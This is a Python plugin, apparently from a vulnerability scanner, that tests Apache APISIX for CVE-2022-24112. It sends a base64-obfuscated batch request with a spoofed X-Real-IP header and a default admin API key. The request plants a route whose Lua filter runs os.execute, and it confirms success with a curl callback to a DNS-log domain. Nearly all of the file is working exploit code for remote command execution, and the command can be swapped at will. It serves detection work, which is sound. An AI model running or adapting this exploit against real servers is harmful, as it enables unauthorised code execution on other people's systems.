#!/usr/bin/env python3
# coding=utf-8

import base64
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    
    url = "{}://{}:{}".format(service, ip, port)

    try:
        payload = 'eyJoZWFkZXJzIjp7IlgtUmVhbC1JUCI6IjEyNy4wLjAuMSIsIkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwidG' \
                  'ltZW91dCI6MTUwMCwicGlwZWxpbmUiOlt7Im1ldGhvZCI6IlBVVCIsInBhdGgiOiIvYXBpc2l4L2FkbWluL3JvdXRlcy9pbmRl' \
                  'eD9hcGlfa2V5PWVkZDFjOWYwMzQzMzVmMTM2Zjg3YWQ4NGI2MjVjOGYxIiwiYm9keSI6IntcclxuIFwibmFtZVwiOiBcInRlc3' \
                  'RcIiwgXCJtZXRob2RcIjogW1wiR0VUXCJdLFxyXG4gXCJ1cmlcIjogXCIvYXBpL3Rlc3RcIixcclxuIFwidXBzdHJlYW1cIjp7' \
                  'XCJ0eXBlXCI6XCJyb3VuZHJvYmluXCIsXCJub2Rlc1wiOntcImh0dHBiaW4ub3JnOjgwXCI6MX19XHJcbixcclxuXCJmaWx0ZX' \
                  'JfZnVuY1wiOiBcImZ1bmN0aW9uKHZhcnMpIG9zLmV4ZWN1dGUoJ0NtZCcpOyByZXR1cm4gdHJ1ZSBlbmRcIn0ifV19'

        details = u'X-REAL-IP 伪造引起命令执行漏洞\n' \
                  u'参考链接: https://apisix.apache.org/zh/blog/2022/02/11/cve-2022-24112/\n'
        domain = dns_monitor(ip, port).add_checker('api-six-batch-requests-rce',
                                                   alert_group='APISix batch requests RCE',
                                                   details=details)
        cmd = 'curl http://' + domain

        r = await http_client(ip, port).post(url+'/apisix/batch-requests',
                                   data=base64.b64decode(payload).decode().replace('Cmd', cmd),
                                   headers={'Content-Type': 'application/json'}, timeout=10.0)
        if r.status_code == 200:
            r = await http_client(ip, port).get(url + '/api/test')

    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8888, 'http', True, task_msg={})
    run_plugin_test(scan)
